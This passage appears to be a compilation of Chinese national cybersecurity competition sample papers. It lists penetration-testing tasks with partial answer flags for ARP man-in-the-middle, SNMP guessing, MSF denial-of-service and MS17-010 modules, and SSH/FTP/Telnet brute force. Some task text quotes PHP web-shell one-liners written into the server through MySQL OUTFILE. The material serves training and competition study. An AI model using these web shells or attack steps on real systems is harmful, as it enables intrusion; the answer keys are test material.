B-7）\n\n\\*任务说明：仅能获取Server7的IP地址\n\n\\*任务说明：仅能获取Server11的IP地址\n\n1.通过上题渗透后得到控制权限的服务器场景Server7进行查看本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\n2.通过上题渗透后得到控制权限的服务器场景Server7进行清除本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\n3.通过本地PC中渗透测试平台Kali对服务器场景Server7以及服务器场景Server11进行中间人攻击渗透测试，打开渗透测试平台Kali的路由转发功能，并将该配置文件的绝对路径作为Flag值提交；\n\n4.通过本地PC中渗透测试平台Kali对服务器场景Server7以及服务器场景Server11进行中间人攻击渗透测试，通过arpspoof命令对客户端（Server7）以及服务器（Server11）进行arp污染 ，并将该操作必须要用到的参数作为Flag值提交；\n\n5.中间人渗透攻击成功后，渗透测试平台kali能够监听到客户端（Server7）向服务器（Server11）中的login.php页面提交的登陆网站用户名，密码信息，使用服务器场景Server7桌面上的Chrome浏览器，访问Server11服务器场景的Web站点[http://Linux](http://linux/)靶机ip/login.php，使用已经保存好的用户名，密码直接登录，并在kali上使用抓包软件wireshark进行抓包，设置wireshark过滤规则，过滤所有请求方式为POST的http请求包，将需要使用的过滤器表达式作为Flag值（\\==符号前后不要加空格）提交；\n\n6.分析抓到的POST请求包，并将POST请求内容中客户端（Server7）向服务器（Server11）中的login.php页面提交的登陆网站admin用户的密码作为Flag值提交。\n\n  \n\n### B-8任务八：PE Reverse\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n猜测IDA打开文件静态调试 找到main函数对应的地址即可\n\n无环境\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\nIDA查看各个函数并分析 将函数名作为FLAG提交即可\n\n无环境\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag1值并提交；\n\nIDA下Shift+F12 查看字符串 找到一串字符串提交即可\n\n无环境\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n猜测通过静态调试分析就可以得到许可证 或 直接找注册后回显的信息\n\n无环境\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交；\n\nIDA找 分析一下即可\n\n无环境\n\n  \n\n### B-9任务九：Web安全应用\n\n\\*任务说明：仅能获取Server9的IP地址\n\n\\*任务说明：仅能获取Server12的IP地址\n\n1.通过渗透机扫描靶机Server9，将HTTP服务的端口号作为Flag值提交；\n\n端口可能有变 具体nmap扫一下即可\n\nFLAG:80\n\n2.通过渗透机渗透靶机Server9的HTTP服务，将Web漏洞注入点的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n无环境\n\n3.通过渗透机访问靶机Server12，获取后缀名为pcapng的数据包文件，该数据包为黑客对靶机Server9的渗透测试过程，并将文件名作为Flag值提交；\n\n无环境\n\n4.通过渗透机分析pcapng数据包文件，将黑客登录管理员用户时使用的密码作为Flag值提交；\n\n无环境\n\n5.通过渗透机分析pcapng数据包文件，将黑客上传的木马文件中的有效代码作为Flag值提交；\n\n无环境\n\n6.通过渗透机分析pcapng数据包文件，将黑客连接数据库时使用的密码作为Flag值提交。\n\n无环境\n\n  \n\n### B-10任务十：Windows系统安全（国赛例卷4 B-4）\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server10进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\n2.将首选DNS服务器地址作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n  \n\n# 国赛例卷7：\n\n### B-1任务一：信息收集与利用（国赛例卷4 B-1）\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.在渗透机Kali2.0中使用autoscan工具扫描服务器场景Server1所在网段(例如：172.16.101.0/24)范围内存活的主机地址。判断存活主机是否开放网络管理服务，若开启则以扫描出开启SNMP服务的主机名作为Flag值提交；\n\n2.在渗透机Kali2.0中使用nmap工具进行UDP扫描服务器场景Server1所在网段范围内存活的主机地址，判断网络管理服务的开放情况，若开启，则以扫描出SNMP开放的端口号作为Flag值（各端口之间用英文分号分割，例21;23），若未开放则提交none作为Flag值；\n\n3.在渗透机Kali2.0中调用snmpwalk工具测试服务器场景Server1是否开启Windows SNMP服务（共同体为默认字符串为public，通过对目标靶机的.1.3.6.1.2.1.25.1.6分支进行snmpwalk来测试服务的开放情况（SNMP 版本为v2c），并将该操作使用的命令中必须要使用的参数作为Flag值（各参数之间用英文分号分割，例a;b）提交；\n\n4.在渗透机Kali2.0中使用ADMsnmp工具尝试猜解团体字符串，并将使用的全部命令作为Flag值（提交答案时IP以192.168.100.10代替，使用默认字典snmp.passwd）提交；\n\n5.更换使用onesixtyone工具执行命令查看帮助选项，并将输入的命令作为Flag值提交；\n\n6.在渗透机Kali2.0中使用onesixtyone对靶机SNMP进行团体字符串猜解，并将使用的全部命令作为Flag值（提交的命令为忽略IP后必须使用的命令，字典名字为dict.txt）提交；\n\n7.在渗透机Kali2.0中对猜解结果进行查看，将回显中猜解的团体字符串作为Flag值提交；\n\n8.在渗透机Kali2.0中选择新的SNMP攻击模块snmpcheck，根据得到的public团体字符串并利用snmpcheck进行对靶机的信息收集，并将该操作使用的命令中必须使用的参数作为Flag值提交；\n\n9.查看获取的系统信息，将系统管理员用户和异常（黑客）用户作为Flag值（各用户之间用英文分号分割，例root;user）提交。\n\n  \n\n### B-2任务二：数据分析数字取证\n\n  \n\n\\*任务说明：仅能获取Server2的IP地址\n\n  \n\n1.分析Server2桌面下的Alpha-1.pcapng数据包文件，通过分析数据包Alpha-1.pcapng找出恶意用户第一次访问服务器的数据包是第几号，并将该号数作为Flag值提交；\n\n  \n\n2.继续查看数据包文件Alpha-1.pcapng，分析出恶意用户扫描了哪些端口，并将全部的端口号从小到大作为Flag值（形式：端口1,端口2,端口3…,端口n）提交；\n\n3.继续查看数据包文件Alpha-1.pcapng分析出恶意用户登陆后台所用的用户名是什么，并将用户名作为Flag值提交；\n\n4.继续查看数据包文件Alpha-1.pcapng分析出恶意用户在第几个数据包到第几个数据包之间利用了MIME漏洞，并将该数据包之间的号数作为Flag值（格式：1,30）提交；\n\n5.继续查看数据包文件Alpha-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值提交；\n\n6.继续查看数据包文件Alpha-1.pcapng分析出恶意用户第二次写入一句话木马是在哪个路径，并将改路径以及文件名和后缀作为Flag值提交；\n\n7.继续查看数据包文件Alpha-1.pcapng分析出恶意用户下载了什么文件，并将该文件内容作为Flag值提交。\n\n  \n\n### B-3任务三：Windows系统安全（国赛例卷4 B-4）\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server3进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\n2.将首选DNS服务器地址作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n  \n\n### B-4任务四：隐写术应用（无环境）\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.找出文件夹1中的文件，将文件中的隐藏信息作为Flag值提交；\n\n2.找出文件夹2中的文件，将文件中的隐藏信息作为Flag值提交；\n\n3.找出文件夹3中的文件，将文件中的隐藏信息作为Flag值提交；\n\n4.找出文件夹4中的文件，将文件中的隐藏信息作为Flag值提交；\n\n5.找出文件夹5中的文件，将文件中的隐藏信息作为Flag值提交。\n\n  \n\n### B-5任务五：PE Reverse（国赛例卷6 B-8）\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag1值并提交；\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交；\n\n  \n\n### B-6任务六：Web渗透测试 （国赛例卷4 B-6）\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.获取PHP的版本号作为Flag值（例如：5.2.14）提交；\n\n2.获取MySQL数据库的版本号作为Flag值（例如：5.0.22）提交；\n\n3.获取系统的内核版本号作为Flag值（例如：2.6.18）提交；\n\n4.获取网站后台管理员admin用户的密码作为Flag值提交；\n\n5.找到/root目录中的txt文件，将文件内容作为Flag值提交。\n\n  \n\n### B-7任务七：MS15034漏洞扫描与利用\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.在MSF工具中用search命令搜索MS15034HTTP.SYS漏洞拒绝服务攻击模块，将回显结果中的漏洞披露时间作为Flag值（如：2015-10-16）提交；\n\nsearch ms15\\_034\n\n![](http://cdn.anyiblog.top/common/1649213880475-ca14dcc2-1c4c-42fe-a0be-1398434304fc.jpg)\nFLAG:2015-04-14\n\n2.在MSF工具中调用MS15034HTTP.SYS漏洞的辅助扫描模块，将调用此模块的命令作为Flag值提交；\n\nFLAG:use auxiliary/scanner/http/ms15\\_034\\_http\\_sys\\_memory\\_dump\n\n3.使用set命令设置目标IP，并检测漏洞是否存在，运行此模块，将回显结果中倒数第2行的最后一个单词作为Flag值提交；\n\nset rhosts IP\n\ncheck\n\nrun\n\n![](http://cdn.anyiblog.top/common/1649213881372-9a50063e-31c0-4cf5-8c9b-330d85436cce.jpg)\nFLAG:complete\n\n4.在MSF工具中调用并运行MS15034HTTP.SYS漏洞的拒绝服务攻击模块，将运行此模块后回显结果中倒数第1行的最后一个单词作为Flag值提交；\n\nuse auxiliary/dos/http/ms15\\_034\\_ulonglongadd > set rhosts IP > run\n\n![](http://cdn.anyiblog.top/common/1649213881885-c5759b65-6b70-4c29-ab63-cb3bb177cbba.jpg)\nFLAG:completed\n\n5.进入靶机在IIS网站下的编辑输出缓存设置中禁止启用内核缓存，再次运行MS15034HTTP.SYS漏洞的拒绝服务攻击模块，运行此模块并将回显结果中倒数第2行的最后一个单词作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213882255-131982f0-55fa-4b79-89e3-d44afa3e1eaf.jpg)\nFLAG:complete\n\n  \n\n### B-8任务八：SSH弱口令渗透测试\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描靶机场景所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为Flag值（忽略ip地址）提交；\n\nnmap -p21,22,23 172.16.101.0/24\n\nFLAG:-p 21,22,23\n\n2.通过渗透机Kali2.0对靶机场景进行系统服务及版本扫描渗透测试，并将该操作显示结果中SSH服务对应的服务端口信息作为Flag值提交；\n\nFLAG:22/tcp\n\n3.在渗透机Kali2.0中使用MSF模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213883858-0599263e-cdd7-420a-85e8-2fc8d68a01b0.jpg)\nFLAG:auxiliary/scanner/ssh/ssh\\_login\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（之间以英文逗号分隔，例hello,test，..,..）提交；\n\nFLAG:RHOSTS,PASS\\_FILE,THREADS,USERNAME\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\nFLAG:set RHOSTS\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为test爆破获取密码并将得到的密码作为Flag值提交；\n\nFLAG:aababb\n\n7.在上一题的基础上，使用第6题获取到的密码SSH到靶机，将test用户家目录中唯一一个后缀为.bmp图片的文件名的字符串作为Flag值提交。\n\n无环境\n\n  \n\n### B-9任务九：Linux系统安全（国赛例卷3 B-8）\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server9进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.找到Flag3作为Flag值提交。\n\n  \n\n### B-10任务十：JS文件上传绕过\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.访问靶机网站http://靶机IP/scrg/，将文件上传页面完整URL作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n猜测通过dirb扫描或测试上传可能的页面\n\n无环境\n\n2.分析文件上传页面，将验证文件格式的函数名称作为Flag值提交；\n\n既然是通过JS写的页面 F12或Ctrl+U查看页面源代码 其中script里的内容即为js的内容 查找一下func 再看内容比对下即可\n\n无环境\n\n3.获取靶机FTP服务下php文件，上传php文件，将修改后的Content-Type信息作为Flag值提交；\n\n猜测文件上传页面应该是前端js对Content-Type做了白名单处理 将其修改为允许的白名单的MIME头即可\n\n无环境\n\n4.分析文件上传时的数据包，将文件上传后的路径作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)文件路径）提交；\n\nburp抓包repeater应该有回显路径 或 页面回显\n\n无环境\n\n5.将靶机网站服务所使用的ServerAPI值作为Flag值提交；\n\n文件上传成功后一句话木马phpinfo();即可 ServerAPI在PHPINFO的页面里查找下即可\n\n无环境\n\n6.将靶机网站服务所使用的版本号作为Flag值提交。\n\n猜测是apache服务或nginx。用nmap -sV IP 扫描 或 nikto -h IP即可\n\n无环境\n\n  \n\n# 国赛例卷8：\n\n  \n\n### B-1任务一：主机发现与信息收集\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过渗透机Kali2.0对靶机场景进行TCP同步扫描 (使用Nmap工具)，并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -sT IP\n\nFLAG:sT\n\n2.通过渗透机Kali2.0对靶机场景进行TCP同步扫描 (使用Nmap工具)，并将该操作显示结果中从下往上数第4行的服务器信息作为Flag值提交；\n\nFLAG:rpcbind\n\n3.通过渗透机Kali2.0对靶机场景不ping主机进行扫描（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -Pn\n\nFLAG:Pn\n\n4.通过渗透机Kali2.0对靶机场景不ping主机进行扫描（使用Nmap工具），并将该操作显示结果中从下往上数第10行的“：”后的数字作为Flag值提交；\n\nFLAG:994\n\n5.通过渗透机Kali2.0对靶机场景进行UDP扫描渗透测试只扫描53，111端口（使用Nmap工具），并将该操作显示结果中111端口的状态信息作为Flag值提交；\n\nnmap -sU -p53,111 IP\n\nFLAG:open|filtered\n\n6.通过渗透机Kali2.0对靶机场景进行滑动窗口扫描渗透测试（使用Nmap工具），并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nnmap -sW IP\n\nFLAG:sW\n\n7.通过渗透机Kali2.0对靶机场景进行RPC扫描扫描渗透测试（使用Nmap工具）,并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -sR IP\n\nFLAG:sR\n\n8.通过渗透机Kali2.0对靶机场景进行RPC扫描扫描渗透测试（使用Nmap工具）,并将该操作显示结果中从下往上数第7行的服务信息作为Flag值提交。\n\nFLAG:http\n\n  \n\n### B-2任务二：FTP弱口令渗透测试（国赛例卷5 B-5）\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描服务器场景Server2所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为Flag值提交（忽略ip地址）；\n\n2.通过渗透机Kali2.0对服务器场景Server2进行系统服务及版本扫描渗透测试，并将该操作显示结果中FTP服务对应的服务端口信息作为Flag值提交；\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值提交（之间以英文逗号分隔，例hello,test，..,..）；\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt,用户名为test爆破获取密码并将得到的密码作为Flag值提交；\n\n7.在上一题的基础上，使用第6题获取到的密码登陆ftp服务，将该目录中Flag值2.bmp的图片文件中的英文单词作为Flag值提交。\n\n  \n\n### B-3任务三：PE Reverse（国赛例卷6 B-8）\n\n\\* 任务说明：仅能获取Server3的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag1值并提交；\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交\n\n  \n\n### B-4任务四：MYSQL安全测试（国赛例卷3 B-3）\n\n  \n\n\\*任务说明：仅能获取Server4的IP地址\n\n  \n\n1.利用渗透机场景kali中的工具确定MySQL的端口，将MySQL端口作为Flag值提交；\n\n  \n\n2.管理者曾在web界面登陆数据库，并执行了select '<?php echo \\\\'<pre>\\\\';system($\\_GET\\[\\\\'cmd\\\\'\\]); echo \\\\'</pre>\\\\'; ?>' INTO OUTFILE 'C:/phpstudy/test1.php'语句，结合本执行语句使用dos命令查看服务器的详细配置信息，并将服务器的系统型号作为Flag值提交；\n\n  \n\n3.利用渗透机场景kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将破解MySQL的密码所需的模块当作Flag值 (账户为root) 提交;\n\n  \n\n4.利用渗透机场景kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将MySQL的密码当作Flag值 (账户为root) 提交;\n\n  \n\n5.利用上题中的数据库账户密码在登陆数据库，通过select '<?php @eval($\\_POST\\[admin\\]);?>'\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\* 'C:/phpstudy/shell.php'语句向服务器提交名为shell.php的一句话木马，将语句中\\*号的明文作为Flag值（\\*为大写字母或者空格）提交；\n\n  \n\n6.使用菜刀连接上题中的shell.php,下载服务器根目录下的压缩包，将压缩包中的Flag值提交。\n\n  \n\n### B-5任务五：流量分析（国赛例卷5 B-4）\n\n  \n\n\\*任务说明：仅能获取Server5的IP地址\n\n  \n\n1.通过Kali访问目标靶机[http://xxx.xxx.xxx.xxx:8081(xxx.xxx.xxx.xxx](http://xxx.xxx.xxx.xxx:8081(xxx.xxx.xxx.xxx/)为靶机IP地址,例如172.16.101.1:8081)下载文件获取流量包。将流量包进行解压，获取流量包中的文件名作为Flag值（形式：文件名.文件类型）提交；\n\n  \n\n2.通过Kali中利用wireshark从服务器场景Server5中下载的流量包进行流量包分析，使用HTTP模式下的过滤表达式过滤HTTP GET方法的流量包，过滤表达式命令作为Flag值提交；\n\n  \n\n3.根据第2步回显信息从过滤出的流量包中分析，找到Flag值文件流量的IP地址，并将该HTTP流量包（第1步中下载的流量包）含Flag值信息的请求源ip作为Flag值提交；\n\n  \n\n4.在渗透测试平台Kali中利用wireshark从包含Flag值信息的流量包中的IP数据包中找到目标信息文件，并将该文件名作为Flag值（形式：文件名.文件类型）提交；\n\n  \n\n5.在渗透测试平台Kali中使用wireshark分析下载的流量包，并从包含Flag值信息的GET/POST请求流量中找出响应IP及响应内容，并将该Flag值请求的响应IP（流量包中的IP）作为Flag值提交；\n\n  \n\n6.使用wireshark工具分析响应流量包（第5步Flag值请求对应的response响应流量数据包）中的数据内容，将该响应数据中的文件名，作为Flag值（形式：文件名.文件类型）提交；\n\n  \n\n7.使用wireshark工具提取流量包中内容（即第6步响应流量包中的文件内容），将该提取操作必须使用的到的wireshark功能的快捷键作为Flag值（xx+xx为Flag值提交格式,例如ctrl+alt+F4）提交；\n\n  \n\n8.将第7步提取出的文件进行解压，将该文件解压后的文件内容第一行作为Flag值提交。\n\n  \n\n  \n\n### B-6任务六：Windows系统安全（国赛例卷4 B-4）\n\n  \n\n\\*任务说明：仅能获取Server6的IP地址\n\n  \n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server6进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\n  \n\n2.将首选DNS服务器地址作为Flag值提交；\n\n  \n\n3.找到Flag1作为Flag值提交；\n\n  \n\n4.找到Flag2作为Flag值提交；\n\n  \n\n5.将系统最高权限管理员账户的密码作为Flag值提交。\n\n  \n\n  \n\n### B-7任务七：Telnet弱口令渗透测试（国赛例卷3 B-7）\n\n  \n\n\\*任务说明：仅能获取Server7的IP地址\n\n  \n\n1.在渗透机Kali2.0中使用Zenmap工具扫描服务器场景Server7所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口，并将该操作使用的命令中必须要添加的字符串作为Flag值（忽略ip地址）提交；\n\n  \n\n2.通过渗透机Kali2.0对服务器场景Server7进行系统服务及版本扫描渗透测试，并将该操作显示结果中TELNET服务对应的服务端口信息作为Flag值提交；\n\n  \n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\n  \n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（字段之间以英文逗号分隔，例hello,test，..,..）提交；\n\n  \n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\n  \n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为user爆破获取密码并将得到的密码作为Flag值提交；\n\n  \n\n7.在上一题的基础上，使用第6题获取到的密码telnet到靶机，将桌面上Flag值.bmp的图片文件中的英文单词作为Flag值提交。\n\n  \n\n  \n\n### B-8任务八：渗透测试\n\n  \n\n\\*任务说明：仅能获取Server8的IP地址\n\n  \n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server8进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\nnmap -n -sV -oX target IP\n\nFLAG:oX\n\n  \n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\nFLAG:msfdb init\n\n  \n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\nFLAG:db\\_import target\n\n  \n\n4.在MSF工具中用search命令搜索搜索MS17010漏洞利用模块，将回显结果中的漏洞公开时间作为flag值（如：2017-10-16）提交；\n\nsearch ms17\\_010\n\n![](http://cdn.anyiblog.top/common/1649213884768-fea1719e-a147-4406-9155-717afcfb7902.jpg)\nFLAG:2017-03-14\n\n  \n\n5.在MSF工具中调用MS17010漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\nFLAG:completed\n\n  \n\n### B-9任务九：隐写术应用（无环境）\n\n  \n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.找出文件夹1中的文件，将文件中的隐藏信息作为Flag值提交；\n\n2.找出文件夹2中的文件，将文件中的隐藏信息作为Flag值提交；\n\n3.找出文件夹3中的文件，将文件中的隐藏信息作为Flag值提交；\n\n4.找出文件夹4中的文件，将文件中的隐藏信息作为Flag值提交；\n\n5.找出文件夹5中的文件，将文件中的隐藏信息作为Flag值提交。\n\n  \n\n### B-10任务十：Wireshark数据包分析（无环境）\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.使用Wireshark查看并分析Server10桌面下的capture4.pcap数据包文件，找出黑客获取到的可成功登录目标服务器FTP的账号密码，并将黑客获取到的账号密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n2.继续分析数据包capture4.pcap，找出黑客使用获取到的账号密码登录FTP的时间，并将黑客登录FTP的时间作为Flag值（例如：14:22:08）提交；\n\n3.继续分析数据包capture4.pcap，找出黑客连接FTP服务器时获取到的FTP服务版本号，并将获取到的FTP服务版本号作为Flag值提交；\n\n4.继续分析数据包capture4.pcap，找出黑客成功登录FTP服务器后执行的第一条命令，并将执行的命令作为Flag值提交;\n\n5.继续分析数据包capture4.pcap，找出黑客成功登录FTP服务器后下载的关键文件，并将下载的文件名称作为Flag值提交；\n\n6.继续分析数据包capture4.pcap，找出黑客暴力破解目标服务器Telnet服务并成功获取到的用户名与密码，并将获取到的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n7.继续分析数据包capture4.pcap，找出黑客在服务器网站根目录下添加的文件，并将该文件的文件名称作为Flag值提交；\n\n8.继续分析数据包capture4.pcap，找出黑客在服务器系统中添加的用户，并将添加的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交。\n\n  \n\n# 国赛例卷9：\n\n### B-1任务一：主机发现与信息收集（国赛例卷3 B-1）\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.在Kali中使用Nmap工具查看本地路由与接口,并将该操作使用的全部命令作为Flag值提交；\n\n2.通过Kali对靶机场景进行VNC服务扫描渗透测试，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\n3.通过Kali对靶机场景进行VNC服务扫描渗透测试，并将该操作显示结果中VNC版本号作为Flag值提交；\n\n4.在Kali中使用Nmap发送空的UDP数据对类DNS服务avahi进行拒绝服务攻击，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\n5.通过Kali对靶机场景进行模糊测试，来发送异常的包到靶机服务器，探测出隐藏在服务器中的漏洞，并将使用的脚本名称作为Flag值（如：MySQL-brute.nse）提交；\n\n6.在Kali中使用Zenmap工具扫描服务器场景可能存在存在远程任意代码执行漏洞，并将使用的脚本名称的字符串作为Flag值（如：MySQL-brute.nse）提交；\n\n7.在Kali中使用Zenmap工具扫描服务器场景可能存在远程任意代码执行漏洞（提示：检测路径为/cgi-bin/bin，需添加\\--script-args uri=/cgi-bin/bin参数），并将该操作显示结果中漏洞编号和发布时间作为Flag值（漏洞编号和发布时间的字符串之间以分号隔开）提交。\n\n### B-2任务二：Web渗透测试（国赛例卷5 B-6）\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.通过渗透机扫描同网段内网中的NBT服务（使用NBTscan工具），将执行内网扫描必须使用的参数作为Flag值提交；\n\n2.通过渗透机扫描靶机80 HTTP服务的目录（使用字典dict.txt，使用工具DirBuster），将后台管理页面的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n3.通过渗透机的火狐浏览器登入靶机HTTP站点的后台管理系统，找到后台管理系统中的漏洞位置，将漏洞位置的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n4.通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的库名作为Flag值提交；\n\n5.通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的用户名作为Flag值提交；\n\n6.通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的密码作为Flag值提交。\n\n  \n\n### B-3任务三：数据分析数字取证（国赛例卷1 B-2）\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.使用Wireshark查看并分析Server3桌面下的attack.pcapng数据包文件，通过分析数据包attack.pcapng找出恶意用户的IP地址，并将恶意用户的IP地址作为Flag值（形式：\\[IP地址\\]）提交；\n\n2.继续查看数据包文件attack.pacapng，分析出恶意用户扫描了哪些端口，并将全部的端口号从低到高作为Flag值（形式：\\[端口名1，端口名2，端口名3…，端口名n\\]）提交；\n\n3.继续查看数据包文件attack.pacapng分析出恶意用户最终获得的用户名是什么，并将用户名作为Flag值（形式：\\[用户名\\]）提交；\n\n4.继续查看数据包文件attack.pacapng分析出恶意用户最终获得的密码是什么，并将密码作为Flag值（形式：\\[密码\\]）提交；\n\n5.继续查看数据包文件attack.pacapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值（形式：\\[一句话密码\\]）提交；\n\n6.继续查看数据包文件attack.pacapng分析出恶意用户下载了什么文件，并将文件名及后缀作为Flag值（形式：\\[文件名.后缀名\\]）提交；\n\n7.继续查看数据包文件attack.pacapng将恶意用户下载的文件里面的内容作为Flag值（形式：\\[文件内容\\]）提交。\n\n  \n\n### B-4任务四：漏洞扫描与利用（国赛例卷5 